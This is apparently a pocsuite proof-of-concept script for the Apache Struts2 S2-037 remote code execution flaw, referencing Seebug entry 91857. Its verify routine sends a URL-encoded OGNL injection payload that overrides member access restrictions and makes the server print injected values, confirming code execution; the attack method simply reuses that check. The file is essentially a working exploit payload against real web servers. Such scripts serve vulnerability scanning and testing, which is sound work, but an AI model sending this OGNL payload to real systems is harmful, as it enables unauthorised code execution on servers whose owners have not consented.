#!/usr/bin/env python
# coding: utf-8
# import os
import random
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '91857'  # ssvid
    version = '1.0'
    author = ['']
    vulDate = ''
    createDate = '2016-06-15'
    updateDate = '2016-06-15'
    references = ['http://www.seebug.org/vuldb/ssvid-91857']
    name = 'Struts2 方法调用远程代码执行漏洞(S2-037)'
    appPowerLink = 'http://struts.apache.org/'
    appName = 'Apache Struts'
    appVersion = ''
    vulType = 'Code Execution'
    desc = '''
    '''
    samples = ['']
    install_requires = ['']

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        # payload = "http://172.16.176.226:8080/struts2-rest-showcase/orders/3"
        rand_num1 = random.randint(300, 3000)
        rand_num2 = random.randint(600, 6000)
        result_str = str(rand_num1) + str(rand_num2)
        payload = "/%28%23yautc5yautc%3D%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3F"
        payload += "@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29.print%28"
        payload += "%23parameters.t1[0]%2B%23parameters.t2[0]%29%3Aindex.xhtml?t1={}&t2={}".format(
            rand_num1, rand_num2)

        payload_url = self.url + payload
        response = req.get(payload_url)
        if result_str in response.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = response.url
        # Write your code here

        return self.parse_output(result)

    def parse_output(self, result):
        # parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
